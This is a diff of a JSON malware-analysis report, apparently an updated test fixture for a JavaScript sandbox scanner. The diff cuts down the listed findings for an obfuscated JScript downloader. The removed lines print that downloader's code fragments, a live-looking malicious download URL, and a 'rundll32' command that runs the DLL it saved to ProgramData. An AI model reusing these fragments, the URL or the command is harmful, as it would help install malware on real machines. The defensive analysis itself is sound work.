@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 932,
+    "score": 390,
     "sections": [
       {
         "auto_collapse": false,
@@ -18,7 +18,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _d = _0x4b[18]\n\t\tvar _e = _0x4b[19]\n\t\tvar _f = _0x4b[20]\n\t\t_b[_0x4b[5]](_0x4b[4], _e, false)\n\t\t_b[_0x4b[6]]()\n\t\tvar _g = new ActiveXObject(_0x4b[9])\n\t\t_g[_0x4b[5]]()\n\t\t_g[_0x4b[11]](_b[_0x4b[8]])\n\t\t_g[_0x4b[13]](_f)\n\t\t_g[_0x4b[14]]()\n\t\t+ _f + _0x4b[22])\n\t\t+ _b[_0x4b[7]])",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _d = _0x4b[18]\n\t\tvar _e = _0x4b[19]\n\t\tvar _f = _0x4b[20]\n\t\t_b[_0x4b[5]](_0x4b[4], _e, false)\n\t\t_b[_0x4b[6]]()\n\t\tif (_b[_0x4b[7]] == 200) {\n\t\t[9 Mark(s) Truncated]",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -42,7 +42,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\t\tNew ActiveXObject: WinHttp.WinHttpRequest.5.1\n\t\tNew ActiveXObject: WScript.Shell\n\t\tNew ActiveXObject: ADODB.Stream\n\t\tActiveXObject(Scripting.FileSystemObject)\n\t\tActiveXObject(WinHttp.WinHttpRequest.5.1)\n\t\tActiveXObject(WScript.Shell)\n\t\tActiveXObject(ADODB.Stream)\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _g = new ActiveXObject(_0x4b[9])",
+        "body": "JavaScript creates an ActiveXObject\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _g = new ActiveXObject(_0x4b[9])",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -66,55 +66,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes data to the console\n\t\tReturning HTTP 200 (Success) with fake response payload 'console.log(\"EXECUTED DOWNLOADED PAYLOAD\");...",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "console_output": 10
-          },
-          "signatures": {
-            "console_output": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: ConsoleOutput",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "creates_wsh_object": 10
-          },
-          "signatures": {
-            "creates_wsh_object": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: CreatesWshObject",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\t\tActiveXObject(Scripting.FileSystemObject)\n\t\tWScript.CreateObject(\"Scripting.FileSystemObject\")\n\t\tnew Scripting.FileSystemObject[12]()\n\t\tScripting.FileSystemObject[12].FolderExists(\"C:\\ProgramData\\Trdce\")\n\t\tScripting.FileSystemObject[12].CreateFolder(\"C:\\ProgramData\\Trdce\")\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
+        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -138,55 +90,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tWinHTTP.WinHTTPRequest[13].Send()",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "network_request": 10
-          },
-          "signatures": {
-            "network_request": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: NetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].Run(\"rundll32 C:\\ProgramData\\Trdce\\desired.dll, HUF_inc_var\")",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "runs_shell": 10
-          },
-          "signatures": {
-            "runs_shell": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: RunsShell",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript writes data to disk\n\t\tScript called ADODBStream.savetofile\n\t\tADODB.Stream[16].SaveToFile(\"C:\\ProgramData\\Trdce\\desired.dll\")\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
+        "body": "JavaScript writes data to disk\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -210,7 +114,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript attempts to sleep or schedule execution after a given delay\n\t\tWScript.Sleep(\"10000\")\n\t\tWScript.Sleep(10000)",
+        "body": "JavaScript attempts to sleep or schedule execution after a given delay\n\t\tWScript.Sleep(10000)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -234,7 +138,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes executable file to disk\n\t\tADODB.Stream[16].SaveToFile(\"C:\\ProgramData\\Trdce\\desired.dll\")\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
+        "body": "JavaScript writes executable file to disk\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -255,246 +159,15 @@
         "tags": {},
         "title_text": "Signature: WritesExecutable",
         "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": null,
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "IOCs extracted by Box.js",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "C:\\ProgramData\\Trdce\\desired.dll",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": null,
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "process": {
-              "file_name": [
-                "C:\\ProgramData\\Trdce\\desired.dll"
-              ]
-            }
-          }
-        },
-        "title_text": "The script wrote the following files",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "C:\\ProgramData\\Trdce",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": null,
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "process": {
-              "file_name": [
-                "C:\\ProgramData\\Trdce"
-              ]
-            }
-          }
-        },
-        "title_text": "The script checked if the following files/folders existed",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          [
-            "KEY_VALUE",
-            {
-              "path": "C:\\ProgramData\\Trdce\\desired.dll",
-              "url": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-            },
-            {}
-          ]
-        ],
-        "body_config": {},
-        "body_format": "MULTI",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": null,
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "process": {
-              "file_name": [
-                "C:\\ProgramData\\Trdce\\desired.dll"
-              ]
-            }
-          },
-          "network": {
-            "dynamic": {
-              "domain": [
-                "orthodentrics.com"
-              ],
-              "uri": [
-                "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-              ],
-              "uri_path": [
-                "/8GE/fdsfdsfewwwe23"
-              ]
-            }
-          }
-        },
-        "title_text": "The script created the following resources associated with a URL",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "ioc": "orthodentrics.com",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "https://orthodentrics.com/8GE/fdsfdsfewwwe23",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "/8GE/fdsfdsfewwwe23",
-            "ioc_type": "uri_path"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "ioc_type",
-            "ioc"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "static": {
-              "domain": [
-                "orthodentrics.com"
-              ],
-              "uri": [
-                "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-              ],
-              "uri_path": [
-                "/8GE/fdsfdsfewwwe23"
-              ]
-            }
-          }
-        },
-        "title_text": "MalwareJail extracted the following IOCs",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "method": "GET",
-            "url": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "url",
-            "method"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 1,
-          "score": 500,
-          "score_map": {
-            "url_used_for_suspicious_exec": 500
-          },
-          "signatures": {
-            "url_used_for_suspicious_exec": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "dynamic": {
-              "domain": [
-                "orthodentrics.com"
-              ],
-              "uri": [
-                "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-              ],
-              "uri_path": [
-                "/8GE/fdsfdsfewwwe23"
-              ]
-            }
-          }
-        },
-        "title_text": "URLs",
-        "zeroize_on_tag_safe": false
       }
     ]
   },
   "files": {
-    "extracted": [
-      {
-        "name": "4af7e12ad0e9238529121a173c6577a819f10a8c3c82226f372720fd04b04c8a",
-        "sha256": "4af7e12ad0e9238529121a173c6577a819f10a8c3c82226f372720fd04b04c8a"
-      },
-      {
-        "name": "extracted_wscript.bat",
-        "sha256": "b20d210cb0e10059d191871493db534e3b2b95eb3d8ecb109734de2cb3446935"
-      }
-    ],
+    "extracted": [],
     "supplementary": []
   },
   "results": {
     "heuristics": [
-      {
-        "attack_ids": [],
-        "heur_id": 1,
-        "signatures": [
-          "url_used_for_suspicious_exec"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
       {
         "attack_ids": [],
         "heur_id": 3,
@@ -513,35 +186,7 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "console_output"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "creates_wsh_object"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
           "file_system_object"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "network_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "runs_shell"
         ]
       },
       {
@@ -566,88 +211,7 @@
         ]
       }
     ],
-    "tags": {
-      "dynamic.process.file_name": [
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "C:\\ProgramData\\Trdce"
-        },
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "C:\\ProgramData\\Trdce\\desired.dll"
-        },
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "C:\\ProgramData\\Trdce\\desired.dll"
-        }
-      ],
-      "network.dynamic.domain": [
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "orthodentrics.com"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [
-            "url_used_for_suspicious_exec"
-          ],
-          "value": "orthodentrics.com"
-        }
-      ],
-      "network.dynamic.uri": [
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [
-            "url_used_for_suspicious_exec"
-          ],
-          "value": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-        }
-      ],
-      "network.dynamic.uri_path": [
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "/8GE/fdsfdsfewwwe23"
-        },
-        {
-          "heur_id": 1,
-          "signatures": [
-            "url_used_for_suspicious_exec"
-          ],
-          "value": "/8GE/fdsfdsfewwwe23"
-        }
-      ],
-      "network.static.domain": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "orthodentrics.com"
-        }
-      ],
-      "network.static.uri": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-        }
-      ],
-      "network.static.uri_path": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "/8GE/fdsfdsfewwwe23"
-        }
-      ]
-    },
+    "tags": {},
     "temp_submission_data": {}
   }
 }
